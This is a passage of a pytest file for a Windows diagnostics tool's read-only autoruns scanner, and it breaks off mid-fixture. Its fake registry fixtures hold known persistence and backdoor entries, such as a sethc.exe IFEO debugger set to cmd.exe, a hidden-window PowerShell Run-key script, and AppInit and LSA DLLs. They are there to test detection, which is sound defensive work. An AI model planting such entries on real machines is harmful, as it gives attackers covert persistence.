import base64
import hashlib
import os
import re
import shutil
import subprocess
from datetime import datetime
from pathlib import Path

import pytest

from portablefix.models import ModuleCategory, RiskLevel
from portablefix.module_engine import load_module

CATALOG_PATH = Path(__file__).resolve().parent.parent / "Modules" / "m07_autoruns" / "actions.yaml"


def test_m07_catalog_loads_8_actions_in_diagnostics_category():
    module = load_module(CATALOG_PATH)
    assert module.module_id == "m07_autoruns"
    assert module.category == ModuleCategory.DIAGNOSTICS
    assert len(module.actions) == 8


def test_m07_catalog_all_actions_safe_readonly():
    module = load_module(CATALOG_PATH)
    for action in module.actions:
        assert action.risk == RiskLevel.SAFE
        assert action.undo_command is None


def test_m07_catalog_covers_all_autostart_surfaces():
    module = load_module(CATALOG_PATH)
    ids = {a.id for a in module.actions}
    assert ids == {
        "autoruns_registry_run",
        "autoruns_startup_folder",
        "autoruns_scheduled_tasks",
        "autoruns_autostart_services",
        "autoruns_wmi_event_subscriptions",
        "autoruns_ifeo_debuggers",
        "autoruns_unquoted_service_paths",
        "autoruns_thirdparty_signed_view",
    }


def test_m07_catalog_wmi_subscriptions_degrades_gracefully_and_notes_legitimate_scm_entry():
    module = load_module(CATALOG_PATH)
    by_id = {a.id: a for a in module.actions}
    action = by_id["autoruns_wmi_event_subscriptions"]
    assert "try {" in action.command
    assert "catch {" in action.command
    assert "SCM Event Log" in action.description_en


def test_m07_catalog_registry_action_covers_hklm_and_hkcu():
    module = load_module(CATALOG_PATH)
    by_id = {a.id: a for a in module.actions}
    command = by_id["autoruns_registry_run"].command
    assert "HKLM:" in command
    assert "HKCU:" in command
    assert "RunOnce" in command


def test_m07_catalog_ifeo_check_covers_both_registry_views_and_flags_accessibility_tools():
    module = load_module(CATALOG_PATH)
    by_id = {a.id: a for a in module.actions}
    command = by_id["autoruns_ifeo_debuggers"].command
    assert "Image File Execution Options" in command
    assert "WOW6432Node" in command
    assert "SilentProcessExit" in command
    for binary in ("sethc.exe", "utilman.exe", "osk.exe"):
        assert binary in command, binary
    assert "SUSPICIOUS" in command
    assert "Set-ItemProperty" not in command and "Remove-Item" not in command


def test_m07_catalog_unquoted_service_paths_ignores_arguments_after_exe():
    # Only the executable part may contain the space - "svchost.exe -k x"
    # must not be flagged just because its arguments have spaces.
    module = load_module(CATALOG_PATH)
    by_id = {a.id: a for a in module.actions}
    command = by_id["autoruns_unquoted_service_paths"].command
    assert "Win32_Service" in command
    assert "-notmatch '^\\s*\"'" in command
    assert "(\\.exe).*$" in command
    assert "Set-ItemProperty" not in command


# --- G04 step 1: autoruns_thirdparty_signed_view ----------------------------
#
# The command runs below in PowerShell against a fake registry, fake scheduled
# tasks, a fake WScript.Shell and a fake Get-AuthenticodeSignature: each is
# shadowed by a function (functions win command lookup) and the script exits
# 97 unless every name really resolves to the stub, so a test run never reads
# the host's autostart locations. The files behind the entries are real files
# under tmp_path, so path resolution, missing files, hashing and timestamps
# are exercised for real. SystemRoot and friends are set inside the script -
# Windows PowerShell cannot start with a fake SystemRoot in its environment.

STUB_GUARD_EXIT = 97
SIGNED_VIEW_ID = "autoruns_thirdparty_signed_view"
MS_SUBJECT = "CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US"
MS_ISSUER = "CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US"
MS_SIG = ("Valid", MS_SUBJECT, MS_ISSUER, False)
THIRD_SIG = ("Valid", "CN=Contoso Ltd, O=Contoso Ltd, C=SK", "CN=DigiCert Trusted G4 Code Signing CA, O=DigiCert", False)
BIG_FILE_BYTES = 201 * 1024 * 1024
RUN_KEY = "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
WOW_RUN_KEY = "HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
SVC_ROOT = "HKLM:\\SYSTEM\\CurrentControlSet\\Services"
WINLOGON_KEY = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
APPINIT_KEY = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows"
LSA_KEY = "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa"
PRINT_MONITORS = "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors"
WINSOCK = "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters"
SESSION_MANAGER = "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager"
IFEO = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"
ACTIVE_SETUP = "HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components"
CATEGORIES = ("Run", "Startup", "ScheduledTask", "Service", "Driver", "Winlogon", "AppInit", "LSA",
              "PrintMonitor", "Winsock", "BootExecute", "IFEO", "ActiveSetup")


def _powershell_or_skip() -> str:
    exe = os.environ.get("PORTABLEFIX_TEST_PWSH") or shutil.which("powershell") or shutil.which("pwsh")
    if not exe:
        pytest.skip("no PowerShell available")
    return exe


def _ps_quote(value: str) -> str:
    return "'" + value.replace("'", "''") + "'"


def _ps_value(value) -> str:
    if isinstance(value, bool):
        return "$true" if value else "$false"
    if isinstance(value, int):
        return str(value)
    if isinstance(value, bytes):
        return f"([byte[]][Convert]::FromBase64String('{base64.b64encode(value).decode()}'))"
    if isinstance(value, (list, tuple)):
        return "([string[]]@(" + ", ".join(_ps_quote(v) for v in value) + "))"
    return _ps_quote(value)


def _signed_view_command() -> str:
    return next(a for a in load_module(CATALOG_PATH).actions if a.id == SIGNED_VIEW_ID).command


def _run_signed_view(tmp, registry, tasks, signatures, shortcuts, get_item_property=None):
    """registry: {key: {value name: value}}; tasks: [(TaskPath, TaskName, State,
    [{Execute, Arguments} | {ClassId}])]; signatures: {file path: (Status,
    Subject, Issuer, IsOSBinary)} - any other file reports NotSigned;
    shortcuts: {.lnk path: (TargetPath, Arguments)}. Returns the result and
    the list of files Get-AuthenticodeSignature was asked about."""
    sig_log = tmp / "sig_calls.log"
    if sig_log.exists():
        sig_log.unlink()
    reg = "; ".join(
        f"$FakeReg[{_ps_quote(key)}] = @{{ "
        + "; ".join(f"{_ps_quote(n)} = {_ps_value(v)}" for n, v in values.items()) + " }"
        for key, values in registry.items()
    )
    sigs = "; ".join(
        f"$FakeSig[{_ps_quote(str(path).lower())}] = @({_ps_quote(st)}, {_ps_quote(sub)}, {_ps_quote(iss)}, {_ps_value(os_bin)})"
        for path, (st, sub, iss, os_bin) in signatures.items()
    )
    lnks = "; ".join(
        f"$FakeLnk[{_ps_quote(str(path))}] = @({_ps_quote(target)}, {_ps_quote(args)})"
        for path, (target, args) in shortcuts.items()
    )

    def task_action(action):
        if "ClassId" in action:
            return f"[pscustomobject]@{{ ClassId = {_ps_quote(action['ClassId'])} }}"
        return (f"[pscustomobject]@{{ Execute = {_ps_quote(action['Execute'])}; "
                f"Arguments = {_ps_quote(action.get('Arguments', ''))} }}")

    task_objs = ", ".join(
        f"[pscustomobject]@{{ TaskPath = {_ps_quote(tp)}; TaskName = {_ps_quote(tn)}; State = {_ps_quote(state)}; "
        f"Actions = @({', '.join(task_action(a) for a in actions)}) }}"
        for tp, tn, state, actions in tasks
    )
    windows = tmp / "Windows"
    env = {
        "SystemRoot": str(windows),
        "ProgramData": str(tmp / "ProgramData"), "APPDATA": str(tmp / "AppData"),
        "PFTEST": str(tmp / "tools"),
    }
    stubs = [
        "$FakeReg = @{}", reg or "$null", "$FakeSig = @{}", sigs or "$null", "$FakeLnk = @{}", lnks or "$null",
        get_item_property or (
            "function Get-ItemProperty { [CmdletBinding()] param([string] $LiteralPath) "
            "$v = $FakeReg[$LiteralPath]; if ($null -ne $v) { $o = [ordered]@{}; foreach ($n in $v.Keys) { $o[$n] = $v[$n] }; "
            "$o['PSPath'] = 'Microsoft.PowerShell.Core\\Registry::' + $LiteralPath; $o['PSChildName'] = 'x'; [pscustomobject]$o } }"
        ),
        "function Get-ChildItem { [CmdletBinding()] param([string] $LiteralPath, [switch] $File, [switch] $Force) "
        "if ($LiteralPath -match '^HK') { $pre = $LiteralPath + '\\'; "
        "@($FakeReg.Keys | Where-Object { $_.StartsWith($pre, [StringComparison]::OrdinalIgnoreCase) } | "
        "ForEach-Object { $_.Substring($pre.Length).Split('\\')[0] } | Sort-Object -Unique) | "
        "ForEach-Object { [pscustomobject]@{ PSChildName = $_ } } } "
        "else { Microsoft.PowerShell.Management\\Get-ChildItem -LiteralPath $LiteralPath -File:$File -Force:$Force -EA SilentlyContinue } }",
        f"function Get-ScheduledTask {{ [CmdletBinding()] param() @({task_objs}) }}",
        "function Get-AuthenticodeSignature { [CmdletBinding()] param([string] $LiteralPath, [string] $FilePath) "
        f"Microsoft.PowerShell.Management\\Add-Content -LiteralPath {_ps_quote(str(sig_log))} -Value $LiteralPath; "
        "$s = $FakeSig[$LiteralPath.ToLowerInvariant()]; "
        "if (-not $s) { return [pscustomobject]@{ Status = 'NotSigned'; SignerCertificate = $null; IsOSBinary = $false } }; "
        "if ($s[0] -eq 'THROW') { throw [System.UnauthorizedAccessException]::new('Prístup bol odmietnutý.') }; "
        "[pscustomobject]@{ Status = $s[0]; SignerCertificate = $(if ($s[1]) { [pscustomobject]@{ Subject = $s[1]; Issuer = $s[2] } }); IsOSBinary = $s[3] } }",
        "function New-Object { [CmdletBinding()] param([string] $ComObject) "
        "if ($ComObject -ne 'WScript.Shell') { exit 98 }; $o = [pscustomobject]@{}; "
        "Add-Member -InputObject $o -MemberType ScriptMethod -Name CreateShortcut -Value { param($p) "
        "$l = $FakeLnk[$p]; [pscustomobject]@{ TargetPath = $(if ($l) { $l[0] } else { '' }); Arguments = $(if ($l) { $l[1] } else { '' }) } }; $o }",
    ]
    names = ["Get-ItemProperty", "Get-ChildItem", "Get-ScheduledTask", "Get-AuthenticodeSignature", "New-Object"]
    guard = (
        "foreach ($n in " + ", ".join(_ps_quote(n) for n in names) + ") { "
        "if ((Get-Command $n -EA SilentlyContinue | Select-Object -First 1).CommandType -ne 'Function') "
        f"{{ exit {STUB_GUARD_EXIT} }} }}"
    )
    env_lines = [f"$env:{name} = {_ps_quote(value)}" for name, value in env.items()]
    # Windows PowerShell 5.1 (.NET Framework) cannot load an assembly once
    # SystemRoot points elsewhere ("The given assembly name or codebase ...
    # mscorlib.dll was invalid"). What the command loads lazily - the
    # error-message resources, the autoloaded modules, the hashing classes -
    # is loaded before the redirect.
    warm_up = [
        "Import-Module Microsoft.PowerShell.Utility, Microsoft.PowerShell.Management, Microsoft.PowerShell.Security",
        "$null = [Security.Cryptography.SHA256]::Create()",
        "try { throw [System.UnauthorizedAccessException]::new('x') } catch { $null = $_ | Out-String; $null = $_.Exception.GetType().Name }",
        "try { Get-Item -LiteralPath (Join-Path $PSHOME 'pf-missing') -EA Stop } catch { $null = $_ | Out-String }",
        "try { throw 'x' } catch { $null = $_ | Out-String }",
    ]
    script = "; ".join(
        ["[Console]::OutputEncoding=[Text.Encoding]::UTF8"] + warm_up + env_lines + stubs + [guard, _signed_view_command()]
    )
    result = subprocess.run(
        [_powershell_or_skip(), "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", script],
        env=dict(os.environ), capture_output=True, text=True, encoding="utf-8", errors="replace", timeout=240,
        creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
    )
    assert result.returncode != STUB_GUARD_EXIT, "a system cmdlet was not stubbed - refusing to run the real one"
    calls = sig_log.read_text(encoding="utf-8").splitlines() if sig_log.exists() else []
    return result, calls


def _parse_entries(stdout: str) -> list:
    entries = []
    header = re.compile(r"^\[(AR-[0-9a-f]{12})\] (\S+) \| (\S+) \| (.+) \| (.+)$")
    for line in stdout.splitlines():
        m = header.match(line)
        if m:
            entries.append({"id": m[1], "status": m[2], "category": m[3], "location": m[4], "name": m[5]})
        elif entries and line.startswith("    ") and ":" in line:
            field, _, value = line.strip().partition(":")
            entries[-1][field] = value.strip()
    return entries


def _file(path: Path, data: bytes = b"MZ fake binary") -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data)
    return path


@pytest.fixture(scope="module")
def signed_view(tmp_path_factory):
    tmp = tmp_path_factory.mktemp("autoruns")
    win = tmp / "Windows"
    s32 = win / "System32"
    vendor = tmp / "vendor"
    app = _file(tmp / "Program Files" / "Vendor App" / "app.exe", b"MZ vendor app")
    tool = _file(tmp / "tools" / "tool.exe")
    os.utime(app, (1_700_000_000, 1_700_000_000))
    ms_files = [_file(s32 / name) for name in (
        "rundll32.exe", "shell32.dll", "powershell.exe", "userinit.exe", "autochk.exe", "svchost.exe", "cmd.exe",
        "msv1_0.dll", "localspl.dll", "mswsock.dll")]
    explorer = _file(win / "explorer.exe")
    for name in ("vendorctl.dll", "vendorpw.dll", "vmon.dll", "vwsp.dll", "vbootchk.exe"):
        _file(s32 / name)
    _file(s32 / "drivers" / "vdrv.sys")
    v2 = _file(s32 / "drivers" / "v2.sys")
    _file(s32 / "drivers" / "nodrv.sys")
    whql = _file(s32 / "drivers" / "whql.sys")
    for name in ("hook.dll", "wow.exe", "svc.dll", "a.dll", "stub.exe", "manual.exe", "disabled.exe"):
        _file(vendor / name)
    tampered = _file(vendor / "tampered.exe")
    fake_ms = _file(vendor / "fake_ms.exe")
    big = vendor / "big.exe"
    with open(big, "wb") as handle:
        handle.truncate(BIG_FILE_BYTES)  # sparse: no real disk use
    startup_all = tmp / "ProgramData" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
    startup_user = tmp / "AppData" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
    lnk = _file(startup_all / "Vendor.lnk", b"L")
    _file(startup_all / "desktop.ini", b"[.ShellClassInfo]")
    _file(startup_user / "helper.bat", b"@echo off")

    registry = {
        RUN_KEY: {
            "Quoted": f'"{app}" --tray',
            "Unquoted": f"{app} --min",
            "EnvTool": "%PFTEST%\\tool.exe -x",
            "Rundll": f'rundll32.exe "{vendor / "hook.dll"}",Start',
            "RundllRel": "rundll32 vendorctl,Run",
            "Ghost": f'"{tmp / "gone" / "ghost.exe"}" /x',
            "Tampered": str(tampered),
            "FakeMs": str(fake_ms),
            "Big": str(big),
            "MsTool": "rundll32.exe shell32.dll,Control_RunDLL",
            "Script": "powershell.exe -NoProfile -WindowStyle Hidden -File C:\\Users\\Public\\x.ps1",
        },
        WOW_RUN_KEY: {"Wow": f'"{vendor / "wow.exe"}"'},
        SVC_ROOT + "\\VendorSvc": {"Start": 2, "Type": 0x20, "ImagePath": "%SystemRoot%\\System32\\svchost.exe -k vendor"},
        SVC_ROOT + "\\VendorSvc\\Parameters": {"ServiceDll": str(vendor / "svc.dll")},
        SVC_ROOT + "\\MsHost": {"Start": 2, "Type": 0x20, "ImagePath": "%SystemRoot%\\System32\\svchost.exe -k netsvcs"},
        SVC_ROOT + "\\MsHost\\Parameters": {"ServiceDll": "%SystemRoot%\\System32\\shell32.dll"},
        SVC_ROOT + "\\UnquotedSvc": {"Start": 2, "Type": 0x10, "ImagePath": f"{app} -service"},
        SVC_ROOT + "\\ManualSvc": {"Start": 3, "Type": 0x10, "ImagePath": str(vendor / "manual.exe")},
        SVC_ROOT + "\\vdrv": {"Start": 1, "Type": 1, "ImagePath": "\\SystemRoot\\System32\\drivers\\vdrv.sys"},
        SVC_ROOT + "\\v2": {"Start": 0, "Type": 1, "ImagePath": "System32\\drivers\\v2.sys"},
        SVC_ROOT + "\\nodrv": {"Start": 0, "Type": 2},
        SVC_ROOT + "\\whql": {"Start": 2, "Type": 1, "ImagePath": "\\SystemRoot\\System32\\drivers\\whql.sys"},
        WINLOGON_KEY: {"Shell": f"explorer.exe, {vendor / 'shellx.exe'}", "Userinit": f"{s32 / 'userinit.exe'},"},
        APPINIT_KEY: {"AppInit_DLLs": f"{vendor / 'a.dll'},{vendor / 'b.dll'}", "LoadAppInit_DLLs": 1},
        LSA_KEY: {"Authentication Packages": ["msv1_0"], "Notification Packages": ["vendorpw"], "Security Packages": ['""']},
        PRINT_MONITORS + "\\Vendor Port": {"Driver": "vmon.dll"},
        PRINT_MONITORS + "\\Local Port": {"Driver": "localspl.dll"},
        WINSOCK + "\\Protocol_Catalog9\\Catalog_Entries\\000000000001": {
            "PackedCatalogItem": b"%SystemRoot%\\System32\\mswsock.dll\x00\x00\x13\x37\x00\xff"},
        WINSOCK + "\\Protocol_Catalog9\\Catalog_Entries64\\000000000002": {
            "PackedCatalogItem": b"%SystemRoot%\\System32\\vwsp.dll\x00junk"},
        WINSOCK + "\\NameSpace_Catalog5\\Catalog_Entries\\000000000003": {
            "LibraryPath": "%SystemRoot%\\System32\\vns.dll"},
        SESSION_MANAGER: {"BootExecute": ["autocheck autochk *", "vbootchk /x"]},
        IFEO + "\\sethc.exe": {"Debugger": "cmd.exe"},
        IFEO + "\\notepad.exe": {"UseFilter": 0},
        ACTIVE_SETUP + "\\{11111111-1111-1111-1111-111111111111}": {"StubPath": f'"{vendor / "stub.exe"}" /install'},
        ACTIVE_SETUP + "\\{22222222-2222-2222-2222-222222222222}": {"StubPath": "rundll32.exe shell32.dll,Setup"},
        ACTIVE_SETUP + "\\{33333333-3333-3333-3333-333333333333}": {"StubPath": str(vendor / "stub.exe"), "IsInstalled": 0},
    }
    tasks = [
        ("\\Vendor\\", "Updater", "Ready", [{"Execute": str(app), "Arguments": "/bg"}]),
        ("\\Microsoft\\Windows\\Maintenance\\", "WinSAT", "Ready",
         [{"Execute": "%SystemRoot%\\system32\\rundll32.exe", "Arguments": "shell32.dll,Maintain"}]),
        ("\\Vendor\\", "Old", "Disabled", [{"Execute": str(vendor / "disabled.exe")}]),
        ("\\Vendor\\", "ComOnly", "Ready", [{"ClassId": "{0F87369F-A4E5-4CFC-BD3E-73E6154572DD}"}]),
    ]
    signatures = {path: MS_SIG for path in ms_files}
    # Catalog-signed OS file: no "O=Microsoft Corporation" in the subject,
    # recognised through IsOSBinary.
    signatures[explorer] = ("Valid", "CN=Microsoft Windows", "CN=Microsoft Windows Production PCA 2011", True)
    signatures[tool] = THIRD_SIG
    signatures[v2] = THIRD_SIG
    # WHQL: a third-party driver that Microsoft signed through its hardware
    # program - still somebody else's code, so it stays visible.
    signatures[whql] = ("Valid", "CN=Microsoft Windows Hardware Compatibility Publisher, O=Microsoft Corporation",
                        "CN=Microsoft Windows Third Party Component CA 2014, O=Microsoft Corporation", False)
    signatures[tampered] = ("HashMismatch", MS_SUBJECT, MS_ISSUER, False)
    # Microsoft in the subject but not issued by a Microsoft CA - not hidden.
    signatures[fake_ms] = ("Valid", "CN=Microsoft Windows, O=Microsoft Corporation", "CN=Cheap CA, O=Other", False)
    shortcuts = {lnk: (str(tool), "--quiet")}
    result, calls = _run_signed_view(tmp, registry, tasks, signatures, shortcuts)
    assert result.returncode == 0, result.stdout + result.stderr
    return {"tmp": tmp, "stdout": result.stdout, "calls": calls, "entries": _parse_entries(result.stdout),
            "app": app, "tool": tool, "vendor": vendor, "s32": s32}


def _entry(view, category, name):
    matches = [e for e in view["entries"] if e["category"] == category and e["name"] == name]
    assert len(matches) == 1, (category, name, view["stdout"])
    return matches[0]


def test_signed_view_is_safe_and_changes_nothing():
    action = next(a for a in load_module(CATALOG_PATH).actions if a.id == SIGNED_VIEW_ID)
    assert action.risk == RiskLevel.SAFE
    assert action.undo_command is None and action.preview_command is None
    for verb in ("Set-Item", "Remove-Item", "New-Item", "Rename-Item", "Set-Content", "Out-File", "Add-Content",
                 "Disable-", "Stop-", "Set-Service", "reg.exe", ".Save(", "Start-Process"):
        assert verb not in action.command, verb
    # StatusMessage is the localized text of a signature check - only the
    # Status enum name may be used.
    assert "StatusMessage" not in action.command
    assert "\n" not in action.command


def test_signed_view_command_parses():
    exe = _powershell_or_skip()
    script = (
        "$e = $null; $t = $null; [void][System.Management.Automation.Language.Parser]::ParseInput("
        "$env:PF_AR_CMD, [ref]$t, [ref]$e); $e | ForEach-Object { $_.ToString() }; exit @($e).Count"
    )
    result = subprocess.run(
        [exe, "-NoProfile", "-NonInteractive", "-Command", script],
        env={**os.environ, "PF_AR_CMD": _signed_view_command()},
        capture_output=True, text=True, encoding="utf-8", errors="replace", timeout=120,
        creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
    )
    assert result.returncode == 0, result.stdout + result.stderr


def test_signed_view_resolves_quoted_unquoted_env_and_rundll32_targets(signed_view):
    app, vendor, s32 = str(signed_view["app"]), signed_view["vendor"], signed_view["s32"]
    assert _entry(signed_view, "Run", "Quoted")["File"] == app
    # Unquoted path with spaces and arguments: the first existing prefix wins.
    assert _entry(signed_view, "Run", "Unquoted")["File"] == app
    assert _entry(signed_view, "Run", "EnvTool")["File"] == str(signed_view["tool"])
    # rundll32 is only the host - the DLL it loads is what gets checked.
    assert _entry(signed_view, "Run", "Rundll")["File"] == str(vendor / "hook.dll")
    rel = _entry(signed_view, "Run", "RundllRel")
    assert rel["File"] == str(s32 / "vendorctl.dll")
    assert "catalog-signed" in rel["Note"]
    assert _entry(signed_view, "ScheduledTask", "\\Vendor\\Updater")["File"] == app
    assert _entry(signed_view, "Service", "UnquotedSvc")["File"] == app
    svc = _entry(signed_view, "Service", "VendorSvc")
    assert svc["File"] == str(vendor / "svc.dll")
    assert "[ServiceDll: " in svc["Command"]
    assert _entry(signed_view, "Driver", "vdrv")["File"] == str(s32 / "drivers" / "vdrv.sys")
    assert _entry(signed_view, "Driver", "v2")["File"] == str(s32 / "drivers" / "v2.sys")
    assert _entry(signed_view, "Driver", "nodrv")["File"] == str(s32 / "drivers" / "nodrv.sys")
    # AppInit_DLLs is a list: every DLL in it is a separate entry.
    appinit = {e["File"]: e["status"] for e in signed_view["entries"] if e["category"] == "AppInit"}
    assert appinit == {str(vendor / "a.dll"): "NotSigned", str(vendor / "b.dll"): "FileMissing"}
    assert _entry(signed_view, "LSA", "Notification Packages")["File"] == str(s32 / "vendorpw.dll")
    assert _entry(signed_view, "PrintMonitor", "Vendor Port")["File"] == str(s32 / "vmon.dll")
    assert _entry(signed_view, "Winsock", "000000000002")["File"] == str(s32 / "vwsp.dll")
    assert _entry(signed_view, "Winsock", "000000000003")["File"] == str(s32 / "vns.dll")
    boot = _entry(signed_view, "BootExecute", "BootExecute")
    assert boot["File"] == str(s32 / "vbootchk.exe")
    assert boot["Command"] == "vbootchk /x"
    assert _entry(signed_view, "ActiveSetup", "{11111111-1111-1111-1111-111111111111}")["File"] == str(vendor / "stub.exe")
    lnk = _entry(signed_view, "Startup", "Vendor.lnk")
    assert lnk["File"] == str(signed_view["tool"])
    assert lnk["Command"].endswith("--quiet")
    assert _entry(signed_view, "Startup", "helper.bat")["status"] == "NotSigned"


def test_signed_view_hides_microsoft_signed_entries_only(signed_view):
    shown = {(e["category"], e["name"]) for e in signed_view["entries"]}
    for hidden in (("Run", "MsTool"), ("Service", "MsHost"), ("Winlogon", "Shell"), ("Winlogon", "Userinit"),
                   ("LSA", "Authentication Packages"), ("PrintMonitor", "Local Port"),
                   ("ScheduledTask", "\\Microsoft\\Windows\\Maintenance\\WinSAT"),
                   ("ActiveSetup", "{22222222-2222-2222-2222-222222222222}"), ("Winsock", "000000000001")):
        assert hidden not in shown, hidden
    # Not autostart at all: manual service, disabled task, COM-only task,
    # uninstalled Active Setup component, desktop.ini, empty LSA package.
    for absent in (("Service", "ManualSvc"), ("ScheduledTask", "\\Vendor\\Old"), ("ScheduledTask", "\\Vendor\\ComOnly"),
                   ("ActiveSetup", "{33333333-3333-3333-3333-333333333333}"), ("Startup", "desktop.ini"),
                   ("LSA", "Security Packages")):
        assert absent not in shown, absent
    assert _entry(signed_view, "Run", "Tampered")["status"] == "HashMismatch"
    fake = _entry(signed_view, "Run", "FakeMs")
    assert fake["status"] == "Valid"
    assert fake["Signer"] == "CN=Microsoft Windows, O=Microsoft Corporation"
    assert _entry(signed_view, "Driver", "v2")["Signer"].startswith("CN=Contoso Ltd")
    assert _entry(signed_view, "Driver", "whql")["Signer"].startswith("CN=Microsoft Windows Hardware Compatibility")
    # An IFEO Debugger is a redirect even when it points at cmd.exe.
    ifeo = _entry(signed_view, "IFEO", "sethc.exe")
    assert ifeo["status"] == "Valid"
    assert ifeo["Note"].startswith("IFEO redirect")
    # Same for a signed script host: the script in its arguments is what runs.
    script = _entry(signed_view, "Run", "Script")
    assert script["status"] == "Valid"
    assert script["File"] == str(signed_view["s32"] / "powershell.exe")
    assert script["Note"].startswith("script host")


def test_signed_view_flags_missing_files_without_checking_them(signed_view):
    vendor = signed_view["vendor"]
    ghost = _entry(signed_view, "Run", "Ghost")
    assert ghost["status"] == "FileMissing"
    assert ghost["Note"] == "file missing"
    assert ghost["SHA256"] == "-" and ghost["Signer"] == "-" and ghost["Modified"] == "-"
    assert _entry(signed_view, "Winlogon", "Shell #2")["File"] == str(vendor / "shellx.exe")
    assert {e["File"] for e in signed_view["entries"] if e["status"] == "FileMissing"} == {
        str(signed_view["tmp"] / "gone" / "ghost.exe"), str(vendor / "shellx.exe"), str(vendor / "b.dll"),
        str(signed_view["s32"] / "vns.dll"),
    }
    assert not any("ghost.exe" in c or "shellx.exe" in c for c in signed_view["calls"])


def test_signed_view_checks_each_file_once_and_skips_hashing_big_files(signed_view):
    calls = [c.lower() for c in signed_view["calls"]]
    assert calls and len(calls) == len(set(calls)), calls
    quoted = _entry(signed_view, "Run", "Quoted")
    assert quoted["SHA256"] == hashlib.sha256(b"MZ vendor app").hexdigest().upper()
    assert quoted["Modified"] == datetime.fromtimestamp(1_700_000_000).strftime("%Y-%m-%d %H:%M:%S")
    assert _entry(signed_view, "Run", "Big")["SHA256"] == "skipped (larger than 200 MB)"


def test_signed_view_ids_are_stable_hashes_of_location_name_and_command(signed_view):
    ids = [e["id"] for e in signed_view["entries"]]
    assert len(ids) == len(set(ids))
    quoted = _entry(signed_view, "Run", "Quoted")
    source = f"{RUN_KEY}|Quoted|{quoted['Command']}".lower()
    assert quoted["id"] == "AR-" + hashlib.sha256(source.encode("utf-8")).hexdigest()[:12]


def test_signed_view_sorts_invalid_and_unsigned_first_and_prints_counts(signed_view):
    rank = {"NotSigned": 1, "FileMissing": 2, "Valid": 3}
    ranks = [rank.get(e["status"], 0) for e in signed_view["entries"]]
    assert ranks == sorted(ranks)
    assert signed_view["entries"][0]["name"] == "Tampered"
    stdout = signed_view["stdout"].replace("\r\n", "\n")
    expected = {"Run": (11, 12), "Startup": (2, 2), "ScheduledTask": (1, 2), "Service": (2, 3), "Driver": (4, 4),
                "Winlogon": (1, 3), "AppInit": (2, 2), "LSA": (1, 2), "PrintMonitor": (1, 2), "Winsock": (2, 3),
                "BootExecute": (1, 2), "IFEO": (1, 1), "ActiveSetup": (1, 2)}
    assert tuple(expected) == CATEGORIES
    for category, (shown, total) in expected.items():
        assert f"\n{category}: {shown} / {total}\n" in stdout, category
    assert (
        "SUMMARY: 40 entries inspected, 10 signed by Microsoft hidden, 30 shown "
        "(invalid signature 1, unsigned 18, file missing 4, valid signature 7)"
    ) in stdout


def test_signed_view_with_nothing_to_show_says_so(tmp_path):
    ms = _file(tmp_path / "Windows" / "System32" / "rundll32.exe")
    result, _ = _run_signed_view(tmp_path, {RUN_KEY: {"Ms": "rundll32.exe shell32.dll,X"}}, [], {ms: MS_SIG}, {})
    assert result.returncode == 0, result.stdout + result.stderr
    # shell32.dll does not exist here: the entry is judged by the DLL that
    # rundll32 would load, not by the Microsoft-signed host.
    missing = _parse_entries(result.stdout)
    assert [e["status"] for e in missing] == ["FileMissing"]
    result, _ = _run_signed_view(tmp_path, {RUN_KEY: {"Ms": str(ms)}}, [], {ms: MS_SIG}, {})
    assert result.returncode == 0, result.stdout + result.stderr
    assert _parse_entries(result.stdout) == []
    assert "No autostart entries outside Microsoft-signed ones found." in result.stdout
    assert "SUMMARY: 1 entries inspected, 1 signed by Microsoft hidden, 0 shown" in result.stdout


def test_signed_view_signature_check_failure_is_listed_first(tmp_path):
    locked = _file(tmp_path / "vendor" / "locked.exe")
    plain = _file(tmp_path / "vendor" / "plain.exe")
    result, _ = _run_signed_view(
        tmp_path, {RUN_KEY: {"Plain": str(plain), "Locked": str(locked)}}, [],
        {locked: ("THROW", "", "", False)}, {},
    )
    assert result.returncode == 0, result.stdout + result.stderr
    entries = _parse_entries(result.stdout)
    assert [(e["name"], e["status"]) for e in entries] == [("Locked", "Unreadable"), ("Plain", "NotSigned")]
    assert entries[0]["SHA256"] == hashlib.sha256(b"MZ fake binary").hexdigest().upper()


def test_signed_view_unreadable_source_still_reports_the_rest_but_exits_nonzero(tmp_path):
    helper = _file(tmp_path / "AppData" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup" / "x.bat")
    result, _ = _run_signed_view(
        tmp_path, {}, [], {}, {},
        get_item_property="function Get-ItemProperty { [CmdletBinding()] param([string] $LiteralPath) throw 'Registry broke' }",
    )
    assert result.returncode == 1, result.stdout + result.stderr
    assert _entry({"entries": _parse_entries(result.stdout), "stdout": result.stdout}, "Startup", "x.bat")["File"] == str(helper)
    assert "SUMMARY: 1 entries inspected" in result.stdout
    assert "Run: cannot be read (RuntimeException)" in result.stdout
    # Sources that first enumerate subkeys find none in the empty fake
    # registry, so only the ones reading fixed keys hit the failure.
    assert "INCOMPLETE: could not read Run, Winlogon, AppInit, LSA, BootExecute" in result.stdout


@pytest.fixture(scope="module")
def proxy_view(tmp_path_factory):
    """Microsoft-signed proxy launchers, 32-bit-only locations and a WHQL
    driver that also reports IsOSBinary."""
    tmp = tmp_path_factory.mktemp("autoruns_proxy")
    win = tmp / "Windows"
    s32, wow = win / "System32", win / "SysWOW64"
    ms_files = [_file(s32 / name) for name in (
